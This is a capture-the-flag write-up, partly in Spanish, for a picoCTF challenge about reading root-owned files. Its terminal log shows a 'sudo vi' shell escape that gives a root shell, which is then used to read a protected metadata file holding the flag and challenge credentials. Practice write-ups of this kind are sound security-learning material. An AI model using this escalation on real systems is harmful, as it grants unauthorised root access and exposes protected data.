Descripción
	Can you read files in the root file?
	Additional details will be available after launching your challenge instance.
	
Solución
	
	┌──(gibran㉿vbox)-[~]
	└─$ ssh -p 59610 picoplayer@saturn.picoctf.net        
	The authenticity of host '[saturn.picoctf.net]:59610 ([13.59.203.175]:59610)' can't be established.
	ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
	This key is not known by any other names.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '[saturn.picoctf.net]:59610' (ED25519) to the list of known hosts.
	picoplayer@saturn.picoctf.net's password: 
	Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1035-aws x86_64)
	
	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage
	
	This system has been minimized by removing packages and content that are
	not required on a system that users do not log into.
	
	To restore this content, you can run the 'unminimize' command.
	
	The programs included with the Ubuntu system are free software;
	the exact distribution terms for each program are described in the
	individual files in /usr/share/doc/*/copyright.
	
	Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
	applicable law.
	
	picoplayer@challenge:~$ cd /
	picoplayer@challenge:/$ ls
	bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
	boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
	picoplayer@challenge:/$ ls -al
	total 0
	drwxr-xr-x   1 root   root     51 Sep 29 15:46 .
	drwxr-xr-x   1 root   root     51 Sep 29 15:46 ..
	-rwxr-xr-x   1 root   root      0 Sep 29 15:46 .dockerenv
	lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
	drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
	d---------   1 root   root     27 Aug  4  2023 challenge
	drwxr-xr-x   5 root   root    340 Sep 29 15:46 dev
	drwxr-xr-x   1 root   root     66 Sep 29 15:46 etc
	drwxr-xr-x   1 root   root     24 Aug  4  2023 home
	lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
	lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
	lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
	lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
	drwxr-xr-x   2 root   root      6 Mar  8  2023 media
	drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
	drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
	dr-xr-xr-x 285 nobody nogroup   0 Sep 29 15:46 proc
	drwx------   1 root   root     23 Aug  4  2023 root
	drwxr-xr-x   1 root   root     54 Sep 29 15:48 run
	lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
	drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
	dr-xr-xr-x  13 nobody nogroup   0 Sep 29 15:46 sys
	drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
	drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
	drwxr-xr-x   1 root   root     17 Mar  8  2023 var
	picoplayer@challenge:/$ [sudo vi -c ':!/bin/sh' /dev/null]
	-bash: [sudo: command not found
	picoplayer@challenge:/$ sudo vi -c ':!/bin/sh' /dev/null
	[sudo] password for picoplayer: 
	
	# cd challenge
	# ls -al
	total 4
	d--------- 1 root root 27 Aug  4  2023 .
	drwxr-xr-x 1 root root 51 Sep 29 15:46 ..
	---------- 1 root root 98 Aug  4  2023 metadata.json
	# cat metadata.json
	{"flag": "picoCTF{uS1ng_v1m_3dit0r_021d10ab}", "username": "picoplayer", "password": "j4ks-9nxB-"}# ^C

	
Notas adicionales
	
	
Referencias
	
	